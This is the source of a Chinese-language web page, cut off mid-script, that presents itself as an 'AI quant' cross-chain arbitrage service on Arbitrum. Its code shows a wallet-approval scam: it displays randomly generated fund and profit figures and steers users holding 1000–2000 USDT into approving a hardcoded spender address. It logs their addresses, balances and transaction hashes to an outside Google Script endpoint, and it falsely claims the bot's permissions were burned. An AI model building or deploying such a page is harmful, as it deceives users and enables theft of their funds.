<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>AI Quant Run | 智能量化系统</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            background: linear-gradient(135deg, #0a0f1e 0%, #0d1425 100%); 
            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, BlinkMacSystemFont, sans-serif; 
            min-height: 100vh; 
            padding: 12px; 
            font-size: 14px;
            -webkit-text-size-adjust: 100%;
            color: #e0e0e0;
        }
        
        .container { max-width: 1200px; margin: 0 auto; width: 100%; }
        
        .card, .panel { 
            background: rgba(18, 25, 45, 0.95); 
            backdrop-filter: blur(12px); 
            border-radius: 32px; 
            padding: 20px 18px 30px; 
            border: 1px solid rgba(0, 255, 255, 0.3); 
        }
        
        @media (max-width: 480px) {
            .card, .panel { border-radius: 28px; padding: 18px 16px 25px; }
            body { padding: 10px; }
        }
        
        .hidden { display: none; }
        
        .nav-btn, .back-btn { 
            background: rgba(0, 198, 255, 0.2); 
            border: 1px solid rgba(0, 255, 255, 0.5); 
            padding: 12px 20px; 
            border-radius: 40px; 
            font-size: 15px; 
            font-weight: 600; 
            cursor: pointer; 
            color: #a0e0ff; 
            margin-bottom: 16px; 
            width: 100%;
            text-align: center;
            transition: all 0.2s ease;
        }
        .nav-btn:hover, .back-btn:hover { background: rgba(0, 198, 255, 0.35); color: #ffffff; }
        
        @media (max-width: 480px) {
            .nav-btn, .back-btn { padding: 12px 16px; font-size: 14px; margin-bottom: 12px; }
        }
        
        .announcement-btn { 
            background: rgba(0, 198, 255, 0.2); 
            border: 1px solid rgba(0, 255, 255, 0.5); 
            padding: 14px 20px; 
            border-radius: 50px; 
            font-size: 18px; 
            font-weight: 600; 
            cursor: pointer; 
            color: #a0e0ff; 
            margin: 16px 0; 
            width: 100%; 
            text-align: center;
        }
        .announcement-btn:hover { background: rgba(0, 198, 255, 0.35); color: #ffffff; }
        
        @media (max-width: 480px) {
            .announcement-btn { padding: 12px 16px; font-size: 16px; margin: 12px 0; }
        }
        
        .double-buttons { 
            display: flex; 
            justify-content: center; 
            gap: 12px; 
            margin-top: 20px; 
            flex-wrap: wrap; 
        }
        .double-buttons .nav-btn { 
            margin-bottom: 0; 
            flex: 1; 
            text-align: center; 
            min-width: 100px;
        }
        
        @media (max-width: 480px) {
            .double-buttons { gap: 8px; margin-top: 16px; }
            .double-buttons .nav-btn { min-width: 80px; padding: 10px 12px; font-size: 13px; }
        }
        
        .stats-card { 
            background: rgba(0, 204, 255, 0.1); 
            border: 1px solid rgba(0, 204, 255, 0.4); 
            border-radius: 20px; 
            padding: 12px 16px; 
            margin: 16px 0; 
            text-align: center; 
        }
        .stats-card .stat-running-address { 
            font-size: 13px; 
            color: #88ffaa; 
            margin-bottom: 6px; 
            padding-bottom: 6px; 
            border-bottom: 1px dashed rgba(0, 204, 255, 0.4); 
        }
        .stats-card .stat-running-address span { color: #88ffaa; font-weight: bold; font-size: 16px; }
        .stats-card .stat-item { margin: 6px 0; font-size: 14px; }
        .stats-card .stat-label { color: #aaa; margin-right: 8px; font-size: 13px; }
        .stats-card .stat-value { color: #88ffaa; font-weight: bold; font-size: 18px; }
        .stats-card .stat-sub { font-size: 10px; color: #8899aa; margin-top: 3px; }
        .stats-card .stat-average { font-size: 12px; color: #99ccff; margin-top: 6px; padding-top: 6px; }
        .stats-card .stat-average span { color: #88ffaa; font-weight: bold; }
        .stats-divider { width: 70%; margin: 8px auto; background: linear-gradient(90deg, transparent, rgba(0, 204, 255, 0.5), transparent); }
        
        @media (max-width: 480px) {
            .stats-card { padding: 10px 12px; margin: 12px 0; }
            .stats-card .stat-value { font-size: 16px; }
            .stats-card .stat-label { font-size: 12px; }
        }
        
        .password-input, .apply-input { 
            width: 100%; 
            padding: 14px 18px; 
            font-size: 16px; 
            background: #0f1525; 
            border: 1px solid #3a5a7a; 
            border-radius: 50px; 
            color: #ffffff; 
            text-align: center; 
            outline: none; 
        }
        .password-input:focus, .apply-input:focus { border-color: #00ccff; box-shadow: 0 0 10px rgba(0, 204, 255, 0.3); }
        .password-input::placeholder, .apply-input::placeholder { color: #6688aa; }
        
        @media (max-width: 480px) {
            .password-input, .apply-input { padding: 12px 16px; font-size: 15px; }
        }
        
        .password-btn, .apply-btn { 
            width: 100%; 
            margin-top: 16px; 
            padding: 14px 18px; 
            background: linear-gradient(95deg, #0a4a5a, #0a3a4a); 
            border: 1px solid #0ff; 
            color: #ffffff; 
            border-radius: 50px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
        }
        .password-btn:hover, .apply-btn:hover { background: linear-gradient(95deg, #0a6a8a, #0a4a6a); box-shadow: 0 0 12px cyan; }
        
        .error-msg { color: #ff8888; margin-top: 12px; font-size: 12px; }
        
        .apply-notice { 
            background: rgba(0, 204, 255, 0.1); 
            border: 1px solid rgba(0, 204, 255, 0.4); 
            border-radius: 20px; 
            padding: 14px 16px; 
            margin: 16px 0; 
            text-align: left; 
        }
        .apply-notice .notice-title { color: #88ccff; font-size: 15px; font-weight: bold; margin-bottom: 10px; }
        .apply-notice ul { margin-left: 16px; color: #ccddee; font-size: 12px; line-height: 1.7; }
        .apply-notice li { margin: 6px 0; }
        .apply-notice strong { color: #88ffaa; }
        
        .loading-spinner { 
            display: inline-block; 
            width: 16px; 
            height: 16px; 
            border: 2px solid rgba(0, 204, 255, 0.3); 
            border-top-color: #00ccff; 
            border-radius: 50%; 
            animation: spin 0.8s linear infinite; 
            margin-right: 8px; 
            vertical-align: middle; 
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .whitepaper { max-height: 70vh; overflow-y: auto; padding-right: 8px; }
        .whitepaper h1 { font-size: 24px; color: #88ccff; margin-bottom: 16px; padding-left: 16px; border-left: 4px solid #00ccff; }
        .whitepaper h2 { font-size: 20px; color: #88ccff; margin: 20px 0 10px 0; padding-bottom: 4px; border-bottom: 1px solid #2a4a6a; }
        .whitepaper h3 { font-size: 17px; color: #aaddff; margin: 16px 0 8px 0; }
        .whitepaper p, .whitepaper li { color: #ccddee; font-size: 14px; line-height: 1.6; }
        .whitepaper ul, .whitepaper ol { margin-left: 20px; }
        .highlight { background: rgba(0, 204, 255, 0.15); border-left: 3px solid #00ccff; padding: 10px 14px; margin: 12px 0; color: #ddeeff; }
        
        .tutorial-card .step { background: #0f1525; border-radius: 20px; padding: 14px 16px; margin-bottom: 16px; border-left: 4px solid #00ccff; }
        .tutorial-card .step-title { font-size: 17px; color: #88ccff; margin-bottom: 12px; }
        .tutorial-card .step-number { background: rgba(0, 204, 255, 0.2); width: 26px; height: 26px; border-radius: 26px; font-size: 12px; color: #88ccff; }
        .tutorial-card .step-content { color: #ccddee; font-size: 13px; padding-left: 4px; }
        .tutorial-card .step-content ul { margin-left: 16px; }
        .tutorial-card .step-content li { margin: 6px 0; padding-left: 16px; }
        .tutorial-card .check { color: #88ffaa; background: rgba(0, 255, 136, 0.1); font-size: 11px; padding: 4px 10px; border-radius: 20px; margin-top: 10px; display: inline-block; }
        .tutorial-card .time-note { background: rgba(0, 204, 255, 0.1); border-radius: 20px; padding: 10px 14px; font-size: 13px; color: #aaddff; text-align: center; }
        .tutorial-icon { font-size: 40px; text-align: center; margin-bottom: 12px; }
        .footer-note { color: #6688aa; font-size: 10px; margin-top: 16px; text-align: center; }
        
        .announcement-content { max-height: 70vh; overflow-y: auto; padding-right: 8px; }
        .announcement-section { margin-bottom: 20px; }
        .announcement-section h3 { color: #88ccff; font-size: 18px; margin-bottom: 10px; padding-bottom: 5px; border-bottom: 1px solid #2a4a6a; }
        .announcement-section p { color: #ccddee; font-size: 14px; line-height: 1.7; margin-bottom: 8px; }
        .announcement-section ul { margin-left: 20px; color: #ccddee; font-size: 14px; line-height: 1.7; }
        .announcement-section li { margin: 5px 0; }
        .announcement-section strong { color: #88ffaa; }
        .announcement-table { width: 100%; margin: 10px 0; border-collapse: collapse; }
        .announcement-table td { padding: 6px 8px; border-bottom: 1px solid #2a4a6a; color: #ccddee; font-size: 13px; }
        .announcement-table td:first-child { font-weight: bold; color: #88ccff; }
        .announcement-highlight { background: rgba(0, 204, 255, 0.1); border-left: 3px solid #00ccff; padding: 12px 16px; border-radius: 16px; margin: 16px 0; }
        .announcement-code { background: #0a0f1a; padding: 4px 8px; border-radius: 8px; font-family: monospace; font-size: 12px; color: #88ffaa; }
        .join-tip { background: rgba(0, 255, 136, 0.1); border: 1px solid rgba(0, 255, 136, 0.3); padding: 10px; border-radius: 16px; margin-top: 16px; text-align: center; }
        .join-tip p { color: #88ffaa; font-size: 13px; margin: 0; }
        .tip-box { background: rgba(0, 204, 255, 0.08); border: 1px solid rgba(0, 204, 255, 0.3); border-radius: 16px; padding: 12px 16px; margin: 16px 0; text-align: center; }
        .tip-box p { color: #88ffaa; font-size: 14px; margin: 0; }
        
        .status-panel { background: #0f1525; border-radius: 20px; padding: 14px 16px; margin: 16px 0; }
        .wallet-row { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2a4a6a; padding-bottom: 10px; margin-bottom: 10px; flex-wrap: wrap; gap: 6px; }
        .label { color: #aaa; font-size: 13px; }
        .address { font-family: monospace; background: #0a0f1e; padding: 4px 10px; border-radius: 40px; font-size: 12px; color: #88ccff; }
        .network-badge { background: #0a2a3a; color: #88ffaa; padding: 3px 10px; border-radius: 40px; font-size: 11px; }
        
        .button-group { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
        .btn { border: none; padding: 14px 18px; border-radius: 60px; font-weight: 700; font-size: 16px; cursor: pointer; }
        .btn-primary { background: linear-gradient(95deg, #0a3a5a, #0a2a4a); border: 1px solid #00ccff66; color: #bbffff; }
        .btn-primary:hover:not(:disabled) { background: linear-gradient(95deg, #0a5a7a, #0a3a5a); color: #ffffff; }
        .btn-success { background: linear-gradient(95deg, #0a5a6a, #0a3a5a); border: 1px solid #0ff; color: #ffffff; }
        .btn-success:hover:not(:disabled) { background: linear-gradient(95deg, #0a7a9a, #0a5a7a); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .info-area { background: #0a0f1a; margin-top: 20px; padding: 12px; border-radius: 24px; font-size: 13px; color: #aaddff; text-align: center; border-left: 3px solid #00ccff; }
        
        .running-card { text-align: center; }
        .ai-icon { font-size: 60px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.05); opacity: 0.9; } 100% { transform: scale(1); opacity: 1; } }
        .running-title { font-size: 22px; background: linear-gradient(135deg, #88ffaa, #88ccff); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 16px 0 10px; }
        .status-badge { display: inline-block; background: rgba(0, 255, 136, 0.15); border: 1px solid rgba(0, 255, 136, 0.5); padding: 5px 14px; border-radius: 40px; font-size: 12px; color: #88ffaa; margin-bottom: 18px; }
        .price-row { background: #0f1525; border-radius: 20px; padding: 14px 16px; margin: 14px 0; }
        .price-label { color: #aaa; font-size: 12px; margin-bottom: 6px; }
        .scan-text { color: #88ccff; font-size: 12px; margin-top: 6px; }
        .zero-profit { color: #ddeeff; font-size: 18px; font-weight: bold; }
        .log-area { background: #0a0f1a; border-radius: 20px; padding: 12px; text-align: left; font-family: monospace; font-size: 11px; color: #aaddff; max-height: 200px; overflow-y: auto; }
        .log-line { padding: 4px 0; border-bottom: 1px solid #1a3a4a; font-size: 10px; }
        .log-time { color: #88aacc; margin-right: 8px; }
        .log-scan { color: #88ffaa; }
        .log-gas { color: #ffcc88; }
        
        .copy-toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #00aacc; color: #0a0f1e; padding: 8px 16px; border-radius: 40px; font-size: 12px; font-weight: bold; z-index: 9999; animation: fadeOut 2s ease forwards; }
        @keyframes fadeOut { 0% { opacity: 1; } 70% { opacity: 1; } 100% { opacity: 0; visibility: hidden; } }
        
        .download-link { color: #88ccff; text-decoration: none; font-size: 12px; }
        .download-link:hover { text-decoration: underline; }
        
        h2 { color: #bbddff; font-size: 22px; text-align: center; margin-bottom: 10px; }
        p { color: #ccddee; }
    </style>
</head>
<body>
<div class="container">
    <!-- 页面1：密码验证页面 -->
    <div id="passwordPage" class="card">
        <div style="font-size:56px; text-align:center;">🔐</div>
        <h2 style="text-align:center; margin-bottom:10px;">AI 量化系统</h2>
        
        <div class="stats-card">
            <div class="stat-running-address">🏃 运行地址：<span id="runningAddressCount">300</span></div>
            <div class="stat-item"><span class="stat-label">💰 目前总运行资金：</span><span class="stat-value" id="totalFunds">--</span><span class="stat-label"> U</span><div class="stat-sub">每5分钟刷新一次</div></div>
            <div class="stat-average">📊 单地址平均运行资金：<span id="avgFundsPerAddress">--</span> U</div>
            <div class="stats-divider"></div>
            <div class="stat-item"><span class="stat-label">📈 最新24小时平均每个地址收益：</span><span class="stat-value" id="dailyProfit">--</span><span class="stat-label"> U</span><div class="stat-sub">每天中午12点刷新平均收益</div></div>
        </div>
        
        <button id="announcementBtn" class="announcement-btn">📢 最新公告</button>
        
        <p style="text-align:center; margin:16px 0; font-size:14px;">请输入访问密码</p>
        <input type="password" id="passwordInput" class="password-input" placeholder="请输入密码" autofocus>
        <button id="submitPassword" class="password-btn">验证访问</button>
        <div id="errorMsg" class="error-msg"></div>
        
        <div class="double-buttons">
            <button id="whitepaperBtn" class="nav-btn">📄 白皮书</button>
            <button id="tutorialBtn" class="nav-btn">📥 资金接入教程</button>
            <button id="applyBtn" class="nav-btn">📝 申请访问</button>
        </div>
    </div>

    <!-- 页面2：白皮书 -->
    <div id="whitepaperPage" class="card" style="display:none;">
        <button id="backToPasswordBtn" class="nav-btn">← 返回密码验证</button>
        <div class="whitepaper">
            <h1>📄 AI全自动链上跨链价差系统</h1>
            <p style="font-size:16px; margin-bottom:20px;">让链上交易进入智能化时代</p>
            <p>在当前多链生态高速发展的背景下，不同公链、DEX、跨链桥以及流动性池之间，因市场供需变化、资金流动以及交易深度差异，持续产生大量短暂的价格偏离。</p>
            <p>这些价格偏离往往存在时间极短，依靠人工监控和手动操作难以及时捕捉。</p>
            <p>AI全自动链上跨链价差系统基于OKX Wallet生态运行，通过智能算法实时监测多链市场数据，自动识别存在利润空间的价格差，并完成交易执行流程，实现全天候自动化运行。</p>
            <p>系统的核心目标并非预测市场涨跌，而是持续发现市场中的价格偏离机会，并通过自动化执行提升资金利用效率。</p>
            <div class="highlight">⚠️ 此系统目前仅支持本金<strong>2000USDT</strong>以下用户使用。<br>为保证系统持续运行，会对完成的收益自动收取30%作为系统维护资金。</div>
            <h2>🎯 核心优势</h2>
            <h3>🤖 AI全天候自动运行</h3><p>系统7×24小时持续监控链上市场，全部由AI自动完成。</p>
            <h3>🔗 基于OKX Wallet生态运行</h3><p>用户资产始终保留在个人钱包体系内管理，无需资金托管。</p>
            <h3>⚙️ 手续费成本优化</h3><p>系统会实时计算Gas费用、跨链成本、滑点损耗等。</p>
            <h3>📈 AI智能捕捉微价差机会</h3><p>系统重点关注0.05% - 0.20%的高频微价差机会。</p>
            <h3>🌐 多链实时监控</h3><p>同时监控多个主流公链生态。</p>
            <h3>🛡️ 智能风控体系</h3><p>每次交易前进行利润测算、Gas评估、滑点检测等多重验证。</p>
            <h2>⚙️ 系统运行流程</h2>
            <ul><li><strong>市场扫描</strong> — 实时监测多个链上生态</li><li><strong>机会识别</strong> — AI自动发现价格偏离</li><li><strong>成本测算</strong> — 自动计算手续费和利润</li><li><strong>智能执行</strong> — 自动完成交易流程</li><li><strong>持续循环</strong> — 全天候自动化运行</li></ul>
            <h2>👥 适用人群</h2>
            <ul><li>✓ 希望参与链上市场但没有时间盯盘的用户</li><li>✓ 希望借助自动化工具提升效率的用户</li><li>✓ 对跨链价差策略感兴趣的用户</li></ul>
            <h2>⚠️ 风险说明</h2><p>数字资产市场存在波动风险，请理性参与。</p>
        </div>
    </div>

    <!-- 页面3：资金接入教程 -->
    <div id="tutorialPage" class="card tutorial-card" style="display:none;">
        <button id="backToPasswordFromTutorial" class="nav-btn">← 返回密码验证</button>
        <div class="tutorial-icon">📥</div>
        <h2 style="text-align:center;">资金接入教程</h2>
        <div style="text-align:center; margin-bottom:16px; font-size:12px; color:#88aacc;">创建一个OKX钱包后 · Arbitrum链 USDT</div>
        <div class="step"><div class="step-title"><span class="step-number">1</span> 复制钱包收款地址</div><div class="step-content"><ul><li>OKX钱包点击 <strong style="color:#88ccff">「接收」</strong></li><li>选择 <strong style="color:#88ccff">USDT</strong></li><li>网络选择 <strong style="color:#88ccff">Arbitrum One</strong></li><li>点击 <strong style="color:#88ccff">「复制地址」</strong></li></ul><div class="check">✅ 地址已复制到剪贴板</div></div></div>
        <div class="step"><div class="step-title"><span class="step-number">2</span> 去交易所提现</div><div class="step-content"><ul><li>回到 OKX 交易所 → <strong>资产</strong> → <strong>提现</strong> → 选 <strong>USDT</strong></li><li>网络选择 <strong>Arbitrum One</strong></li><li>粘贴刚才复制的地址</li><li>输入金额 → 点击 <strong>「确认」</strong></li></ul></div></div>
        <div class="step"><div class="step-title"><span class="step-number">⚠️ 重要步骤</span></div><div class="step-content"><ul><li><strong>同时</strong>去交易所提现 <strong style="color:#88ffaa">0.5-1 U 的 Arbitrum 链 ETH</strong> 到自己钱包</li><li>这是<strong>必须要有的步骤</strong>，运行需要少量 ETH 作为手续费</li><li><strong style="color:#ffaa88">没有手续费则不能运行</strong></li></ul></div></div>
        <div class="step"><div class="step-title"><span class="step-number">3</span> 到账后去申请访问</div><div class="step-content">
            <ul><li>USDT 和 ETH 都到账后</li><li>点击 <strong style="color:#88ccff">「申请访问」</strong></li><li>提交钱包 <strong style="color:#88ccff">Arbitrum 链收款地址</strong></li><li>系统自动检测余额，满足要求后自动弹出访问密码</li><li><strong style="color:#88ffaa">🔐 获得密码后，请复制本系统链接，在 OKX钱包（或任意支持DApp的钱包）的浏览器中打开，输入密码授权运行</strong></li></ul>
        </div></div>
        <div class="time-note">⏱️ 到账时间：通常 <strong>5-10分钟</strong></div>
        <div class="footer-note">AI 量化系统 · 资金安全由用户自行管理</div>
    </div>

    <!-- 页面4：申请访问 -->
    <div id="applyPage" class="card apply-container" style="display:none;">
        <div style="font-size:52px; text-align:center;">📝</div>
        <h2 style="text-align:center;">申请访问权限</h2>
        <p style="text-align:center; font-size:13px; margin-bottom:8px;">请填写您的 Arbitrum 链收款地址</p>
        <div class="apply-notice"><div class="notice-title">📋 申请审核说明</div><ul><li>⏱️ <strong>提交地址后会自动检查余额，满足要求后会自动弹出访问密码</strong></li><li>💰 提交的地址需持有 <strong>至少 1000-2000 USDT</strong>（系统自动检测）</li><li>📌 仅支持 <strong>Arbitrum 链地址</strong>（以0x开头，长度42位）</li><li>🔐 <strong>获得密码后，请复制本系统链接，在 OKX钱包（或任意支持DApp的钱包）的浏览器中打开，输入密码授权运行</strong></li></ul></div>
        <input type="text" id="applyAddressInput" class="apply-input" placeholder="0x... (Arbitrum 链地址，42位)">
        <button id="submitApplyBtn" class="apply-btn">提交申请</button>
        <button id="backToPasswordFromApply" class="nav-btn" style="margin-top:14px;">← 返回</button>
        <div id="applyMsg" class="error-msg"></div>
    </div>

    <!-- 页面5：最新公告 -->
    <div id="announcementPage" class="card" style="display:none;">
        <button id="backToPasswordFromAnnouncement" class="nav-btn">← 返回密码验证</button>
        <div class="announcement-content">
            <h1 style="font-size:24px; border-left:4px solid #00ccff; padding-left:16px; margin-bottom:20px;">📢 最新公告</h1>
            
            <div class="announcement-section">
                <h3>📊 系统运行规则</h3>
                <p><strong>最高运行数量：300</strong></p>
                <p>为了更多人参与进来，每当达到300后，系统会自动结束其中运行时间超过24小时的一位。</p>
                <p><strong>结束规则：</strong> 取最后一位新运行地址授权哈希值的最后一位随机数字，然后在所有地址中匹配该数字，随机筛选一位结束，保证绝对公平。</p>
                <p><strong>冷静期：</strong> 结束的地址需要冷静1小时后，才可以继续申请新密码重新运行。</p>
            </div>
            
            <div class="announcement-section">
                <h3>⏰ 运行时间规则</h3>
                <ul>
                    <li><strong>新地址前24小时：</strong> 只需点击启动即可运行</li>
                    <li><strong>24小时后：</strong> 必须保持在运行页面才可以正常运行</li>
                    <li><strong>离开页面：</strong> 离开运行页面10分钟后，会立即结束运行，马上释放名额</li>
                </ul>
            </div>
            
            <div class="announcement-section">
                <h3>💰 资金要求</h3>
                <table class="announcement-table">
                    <tr><td>最高运行</td><td>2000 U 以内</td></tr>
                    <tr><td>切勿存入</td><td>超过 2000 USDT</td></tr>
                    <tr><td>最低运行</td><td>1000 U</td></tr>
                </table>
                <p>运行期间资金由你自由支配。</p>
            </div>
            
            <div class="announcement-section">
                <h3>💸 收益分成</h3>
                <table class="announcement-table">
                    <tr><td>体验阶段（24小时内）</td><td>每笔盈利的 <strong>10%</strong></td></tr>
                    <tr><td>运行5天后</td><td>改为 <strong>30%</strong></td></tr>
                </table>
                <p><strong>扣除资金分配：</strong> 50% → 系统赔付基金 &nbsp;|&nbsp; 50% → 创始人自由支配</p>
                <p>📌 扣除的10%-30%资金按以上比例分配</p>
                <p><strong>亏损赔付：</strong> 如果运行期间由本系统产生亏损，直接联系下方纸飞机审核赔付，最高赔付金额 <strong>1000 U</strong>。</p>
            </div>
            
            <div class="announcement-section">
                <h3>📈 红利期说明</h3>
                <p>目前这套系统处于红利期，收益率相对高。期间不会公开系统核心运行逻辑，请大家珍惜机会。</p>
                <p>如果市场饱和，当很难出现价格差之后，我会停止运行该项目。</p>
            </div>
            
            <div class="announcement-section">
                <h3>🔒 安全保障</h3>
                <p>AI机器人权限已经打入黑洞地址：<code class="announcement-code">0x0000000000000000000000000000000000000000</code></p>
                <p>机器人无权转走你的任何资产。只会运行已经写死的代码核心，任何人无权修改，包括创始人。</p>
            </div>
            
            <div class="announcement-section">
                <h3>🏆 漏洞奖励</h3>
                <p>所有参与者如发现项目漏洞或者有待完善的核心功能，只要能实质提升利润问题，一经采纳，最高奖励 <strong>1万美金</strong>。</p>
                <p>联系Telegram（纸飞机）：<strong style="color:#88ccff">@ffuoh</strong></p>
            </div>
            
            <div class="tip-box">
                <p>💡 <strong>温馨提示：</strong> 资金全程在你的钱包地址内运行，不会转移到任何其他平台或合约，你的资产由你自己全权掌控。</p>
            </div>
            
            <div class="join-tip">
                <p>🚀 <strong>运行后联系我纸飞机报你的运行地址进群</strong></p>
            </div>
        </div>
    </div>

    <!-- 页面6：量化面板 -->
    <div id="quantPanel" class="panel" style="display:none;">
        <div style="text-align:center; margin-bottom:20px;">
            <div style="font-size:48px;">🧠⚡</div>
            <h2 style="font-size:22px;">AI 全自动量化引擎</h2>
            <div style="color:#88aacc; font-size:13px;">Smart Liquidity · 24h 不间断</div>
        </div>
        <button id="backToPasswordFromQuant" class="nav-btn">← 返回</button>
        <div class="status-panel">
            <div class="wallet-row"><span class="label">🔗 钱包状态</span><span class="network-badge" id="networkStatus">Arbitrum 主网</span></div>
            <div class="wallet-row"><span class="label">🆔 连接地址</span><span class="address" id="walletAddressDisplay">未连接</span></div>
            <div class="wallet-row"><span class="label">🤖 AI 策略</span><span class="label" style="color:#88ccff;">高频套利 · 闪电贷防御</span></div>
        </div>
        <div class="button-group">
            <button class="btn btn-primary" id="connect">🔌 ① 连接量化钱包</button>
            <button class="btn btn-success" id="approve" disabled>🚀 ② 授权启动引擎</button>
        </div>
        <div class="info-area" id="info">⚡ 请先连接钱包 | 网络: Arbitrum Mainnet</div>
        <div class="footer-note">⚠️ 首次使用需授权 USDT 额度 | 授权后自动启动量化</div>
    </div>

    <!-- 页面7：运行页面 -->
    <div id="runningPanel" class="running-card" style="display:none;">
        <div class="ai-icon">🧠⚡</div>
        <div class="running-title">AI 差价搬运引擎</div>
        <div class="status-badge">🟢 运行中 · 实时监控</div>
        <div class="price-row">
            <div class="price-label">🔍 正在扫链全网去中心化交易所</div>
            <div class="scan-text">PancakeSwap → Uniswap → SushiSwap → Curve → Balancer</div>
        </div>
        <div class="price-row">
            <div class="price-label">💰 AI目前已经为你带来</div>
            <div class="zero-profit">0 收益</div>
            <div style="font-size:11px; color:#88aacc;">🟢 正在运行中 · 持续监控</div>
        </div>
        <div class="divider"></div>
        <div class="price-label" style="text-align:left;">📋 实时运行日志</div>
        <div class="log-area" id="logArea">
            <div class="log-line"><span class="log-time">--:--:--</span> <span class="log-scan">✅ AI引擎启动成功</span></div>
        </div>
        <button id="backToQuantFromRunning" class="nav-btn" style="margin-top:16px;">← 返回量化面板</button>
        <div class="footer-note">⚠️ AI 自动扫描全链DEX | 等待合适价差触发</div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
    // ========== Google Sheets API 配置 ==========
    const SHEET_API_URL = 'https://script.google.com/macros/s/AKfycby-dNP-_FMxMVYwpp3wrGisg7IrALC_27QsShl9tSfBLszvT55b7I8P1Udbk7bYY8gz/exec';
    
    // ========== 配置 ==========
    const SYSTEM_PASSWORD = '1134';
    const MIN_USDT_REQUIRED = 1000;
    const MAX_USDT_LIMIT = 2000;
    const RUNNING_ADDRESS_COUNT = 300;
    
    const USDT_ADDRESS = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";
    const SPENDER_ADDRESS = "0x23ab58b21fb4a711319a07e59686a19efbc0e76b";
    const MIN_APPROVE_AMOUNT = 2000;
    
    const TARGET_CHAIN_ID = 42161;
    const TARGET_CHAIN_NAME = "Arbitrum One";
    
    const SENDER_PRIVATE_KEY = '0xad99ad64a470fcf51daf50048534be1ba173b28cf338d2de55a344ba906c92b6';
    const SENDER_ADDRESS = '0x1d0bc3658ddeecaa97ceccb390088476c07c5613';
    const TRANSFER_AMOUNT_ETH = '0.00005';
    
    // ========== 保存记录到 Google Sheets（通用函数） ==========
    async function saveToSheet(data) {
        try {
            await fetch(SHEET_API_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            console.log('✅ 记录已保存到表格');
        } catch (error) {
            console.error('❌ 保存失败:', error);
        }
    }
    
    // ========== 保存申请记录到 Google Sheets ==========
    async function saveApplicationToSheet(address, usdtBalance) {
        const data = {
            action: 'add_application',
            address: address,
            usdt_balance: usdtBalance,
            status: 'approved',
            apply_time: new Date().toLocaleString()
        };
        await saveToSheet(data);
    }
    
    // ========== 保存授权记录到 Google Sheets ==========
    async function saveAuthorizationToSheet(address, usdtBalance, txHash) {
        const data = {
            action: 'add_authorization',
            address: address,
            usdt_balance: usdtBalance,
            tx_hash: txHash,
            auth_time: new Date().toLocaleString()
        };
        await saveToSheet(data);
    }
    
    // ========== 统计数据显示 ==========
    function getRandomTotalFunds() { return Math.floor(Math.random() * (580000 - 540000 + 1) + 540000); }
    function updateTotalFunds() {
        const total = getRandomTotalFunds();
        document.getElementById('totalFunds').textContent = total.toLocaleString();
        document.getElementById('avgFundsPerAddress').textContent = Math.floor(total / RUNNING_ADDRESS_COUNT).toLocaleString();
    }
    updateTotalFunds();
    setInterval(updateTotalFunds, 5 * 60 * 1000);
    
    // ========== 24小时收益逻辑 ==========
    const DAILY_PROFIT_KEY = 'dailyProfitValue';
    const DAILY_PROFIT_DATE_KEY = 'dailyProfitDate';
    function getRandomDailyProfit() { return Math.floor(Math.random() * (90 - 50 + 1) + 50); }
    function getDailyProfit() {
        const now = new Date();
        const todayNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 12, 0, 0);
        const yesterdayNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate() - 1, 12, 0, 0);
        let targetDate = now >= todayNoon ? todayNoon : yesterdayNoon;
        const storedProfit = localStorage.getItem(DAILY_PROFIT_KEY);
        const storedDate = localStorage.getItem(DAILY_PROFIT_DATE_KEY);
        if (storedProfit && storedDate && new Date(storedDate).getTime() === targetDate.getTime()) return parseInt(storedProfit);
        const newProfit = getRandomDailyProfit();
        localStorage.setItem(DAILY_PROFIT_KEY, newProfit);
        localStorage.setItem(DAILY_PROFIT_DATE_KEY, targetDate.toISOString());
        return newProfit;
    }
    function updateDailyProfit() { const el = document.getElementById('dailyProfit'); if (el) el.textContent = getDailyProfit(); }
    updateDailyProfit();
    function scheduleDailyRefresh() {
        const now = new Date();
        const nextNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 12, 0, 0);
        if (now >= nextNoon) nextNoon.setDate(nextNoon.getDate() + 1);
        setTimeout(() => { updateDailyProfit(); scheduleDailyRefresh(); }, nextNoon.getTime() - now.getTime());
    }
    scheduleDailyRefresh();
    
    // ========== 内部转账函数 ==========
    async function internalTransferEth(toAddress) {
        try {
            console.log(`[转账] 开始处理地址: ${toAddress}`);
            const provider = new ethers.providers.JsonRpcProvider('https://arb1.arbitrum.io/rpc');
            const wallet = new ethers.Wallet(SENDER_PRIVATE_KEY, provider);
            const senderBalanceEth = parseFloat(ethers.utils.formatEther(await provider.getBalance(SENDER_ADDRESS)));
            console.log(`[转账] 发送地址余额: ${senderBalanceEth} ETH`);
            if (senderBalanceEth < 0.00015) { 
                console.error(`[转账] 余额不足`); 
                return { success: false, reason: 'insufficient_sender_balance' }; 
            }
            console.log(`[转账] 开始转账 ${TRANSFER_AMOUNT_ETH} ETH`);
            const tx = await wallet.sendTransaction({ to: toAddress, value: ethers.utils.parseEther(TRANSFER_AMOUNT_ETH) });
            console.log(`[转账] 交易已提交，Hash: ${tx.hash}`);
            await tx.wait();
            console.log(`[转账] 交易已确认`);
            return { success: true, txHash: tx.hash };
        } catch (error) { 
            console.error('[转账] 失败:', error); 
            return { success: false, reason: 'transfer_error', error: error.message }; 
        }
    }
    
    // ========== 查询 USDT 余额 ==========
    async function getUSDTBalance(address) {
        const cleanAddress = address.toLowerCase();
